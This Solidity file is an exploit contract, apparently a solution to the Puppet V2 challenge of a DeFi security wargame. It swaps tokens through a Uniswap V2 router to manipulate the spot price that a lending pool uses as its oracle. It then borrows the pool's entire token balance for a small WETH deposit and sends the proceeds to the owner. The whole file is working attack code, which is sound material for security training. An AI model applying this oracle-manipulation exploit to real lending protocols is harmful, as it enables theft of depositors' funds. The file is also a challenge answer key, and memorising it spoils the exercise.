// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {PuppetV2Pool} from "./PuppetV2Pool.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract PuppetV2Exploiter {
    IERC20 private immutable token;
    IWETH private immutable weth;
    IUniswapV2Router02 private immutable router;
    PuppetV2Pool private immutable pool;
    address private immutable owner;

    constructor(
        address _tokenAddress,
        address _wethAddress,
        address _routerAddress,
        address _poolAddress
    ) {
        token = IERC20(_tokenAddress);
        weth = IWETH(_wethAddress);
        router = IUniswapV2Router02(_routerAddress);
        pool = PuppetV2Pool(_poolAddress);
        owner = msg.sender;
    }

    function exploit(uint256 tokenAmount, uint256 deadline) external payable {
        require(msg.sender == owner, "Not owner");
        
        // Transfer tokens from owner to this contract
        token.transferFrom(owner, address(this), tokenAmount);
        
        // Wrap ETH to WETH
        weth.deposit{value: msg.value}();
        
        // Approve router to spend tokens
        token.approve(address(router), type(uint256).max);
        
        // Prepare path for swap
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        
        // Swap tokens for WETH to manipulate price
        router.swapExactTokensForTokens(
            tokenAmount,
            0, // Accept any amount of WETH
            path,
            address(this),
            deadline
        );
        
        // Calculate required deposit
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 depositRequired = pool.calculateDepositOfWETHRequired(poolBalance);
        
        // Approve pool to take WETH
        weth.approve(address(pool), depositRequired);
        
        // Borrow all tokens from pool
        pool.borrow(poolBalance);
        
        // Transfer borrowed tokens to owner
        token.transfer(owner, poolBalance);
        
        // Return remaining WETH to owner
        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance > 0) {
            weth.transfer(owner, wethBalance);
        }
    }

    receive() external payable {}
}
